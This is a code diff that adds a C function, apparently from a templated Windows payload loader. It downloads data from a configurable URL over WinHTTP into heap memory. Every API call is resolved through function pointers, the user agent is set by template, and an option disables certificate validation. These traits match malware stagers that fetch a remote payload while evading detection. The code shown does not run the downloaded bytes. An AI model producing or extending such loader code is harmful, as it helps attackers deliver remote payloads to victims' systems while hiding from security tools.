@@ -1,0 +1,102 @@
+BOOL LoadData(PBYTE* ppData, PDWORD pdwDataSize) {
+    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
+    BOOL bResults = FALSE;
+    LPWSTR wide_url = NULL;
+    LPWSTR wide_user_agent = NULL;
+    PBYTE pBuffer = NULL;
+    DWORD dwSize = 0;
+    DWORD dwDownloaded = 0;
+
+    const char* url_str = "{{ url }}";
+    const char* user_agent_str = "{{ user_agent }}";
+    int url_len = MultiByteToWideChar(CP_UTF8, 0, url_str, -1, NULL, 0);
+    wide_url = (LPWSTR)pfnHeapAlloc(pfnGetProcessHeap(), 0, url_len * sizeof(WCHAR));
+    MultiByteToWideChar(CP_UTF8, 0, url_str, -1, wide_url, url_len);
+
+    int ua_len = MultiByteToWideChar(CP_UTF8, 0, user_agent_str, -1, NULL, 0);
+    wide_user_agent = (LPWSTR)pfnHeapAlloc(pfnGetProcessHeap(), 0, ua_len * sizeof(WCHAR));
+    MultiByteToWideChar(CP_UTF8, 0, user_agent_str, -1, wide_user_agent, ua_len);
+
+    hSession = pfnWinHttpOpen(wide_user_agent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!hSession) goto cleanup;
+
+    URL_COMPONENTSW urlComp;
+    wchar_t hostName[256];
+    wchar_t urlPath[2048];
+    memset(&urlComp, 0, sizeof(urlComp));
+    urlComp.dwStructSize = sizeof(urlComp);
+    urlComp.lpszHostName = hostName;
+    urlComp.dwHostNameLength = 256;
+    urlComp.lpszUrlPath = urlPath;
+    urlComp.dwUrlPathLength = 2048;
+    urlComp.nScheme = INTERNET_SCHEME_UNKNOWN;
+
+    if (!pfnWinHttpCrackUrl(wide_url, 0, 0, &urlComp)) goto cleanup;
+    
+    hConnect = pfnWinHttpConnect(hSession, hostName, urlComp.nPort, 0);
+    if (!hConnect) goto cleanup;
+
+    hRequest = pfnWinHttpOpenRequest(hConnect, L"GET", urlPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, (urlComp.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0);
+    if (!hRequest) goto cleanup;
+    
+    if (urlComp.nScheme == INTERNET_SCHEME_HTTPS && {{ trust_invalid_cert }} == 1) {
+        DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
+        pfnWinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
+    }
+
+    if (!pfnWinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) goto cleanup;
+    if (!pfnWinHttpReceiveResponse(hRequest, NULL)) goto cleanup;
+
+    DWORD dwContentLength = 0;
+    DWORD dwSizeOfContentLength = sizeof(dwContentLength);
+    if (pfnWinHttpQueryHeaders(hRequest, WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &dwContentLength, &dwSizeOfContentLength, WINHTTP_NO_HEADER_INDEX)) {
+        DEBUG_PRINT("LoadData: Content-Length is %u. Allocating a single buffer.", dwContentLength);
+        pBuffer = (PBYTE)pfnHeapAlloc(pfnGetProcessHeap(), 0, dwContentLength);
+        if (pBuffer) {
+            pfnWinHttpReadData(hRequest, pBuffer, dwContentLength, &dwDownloaded);
+            *ppData = pBuffer;
+            *pdwDataSize = dwDownloaded;
+            bResults = TRUE;
+            pBuffer = NULL; // Prevent cleanup from freeing this buffer
+        }
+    } else {
+        DEBUG_PRINT("LoadData: Content-Length not available. Using fallback chunked download.");
+        DWORD totalSize = 0;
+        do {
+            dwSize = 0;
+            if (!pfnWinHttpQueryDataAvailable(hRequest, &dwSize)) break;
+            if (dwSize == 0) break;
+            PBYTE tempBuffer = (PBYTE)pfnHeapAlloc(pfnGetProcessHeap(), 0, dwSize + 1);
+            if (!tempBuffer) break;
+            if (!pfnWinHttpReadData(hRequest, tempBuffer, dwSize, &dwDownloaded)) {
+                pfnHeapFree(pfnGetProcessHeap(), 0, tempBuffer);
+                break;
+            }
+            PBYTE newBuffer = (PBYTE)pfnHeapAlloc(pfnGetProcessHeap(), 0, totalSize + dwDownloaded);
+            if (pBuffer) {
+                pfnRtlMoveMemory(newBuffer, pBuffer, totalSize);
+                pfnHeapFree(pfnGetProcessHeap(), 0, pBuffer);
+            }
+            pfnRtlMoveMemory(newBuffer + totalSize, tempBuffer, dwDownloaded);
+            pBuffer = newBuffer;
+            totalSize += dwDownloaded;
+            pfnHeapFree(pfnGetProcessHeap(), 0, tempBuffer);
+        } while (dwSize > 0);
+
+        if (totalSize > 0) {
+            *ppData = pBuffer;
+            *pdwDataSize = totalSize;
+            bResults = TRUE;
+            pBuffer = NULL;
+        }
+    }
+
+cleanup:
+    if (hRequest) pfnWinHttpCloseHandle(hRequest);
+    if (hConnect) pfnWinHttpCloseHandle(hConnect);
+    if (hSession) pfnWinHttpCloseHandle(hSession);
+    if (wide_url) pfnHeapFree(pfnGetProcessHeap(), 0, wide_url);
+    if (wide_user_agent) pfnHeapFree(pfnGetProcessHeap(), 0, wide_user_agent);
+    if (pBuffer) pfnHeapFree(pfnGetProcessHeap(), 0, pBuffer);
+    return bResults;
+}
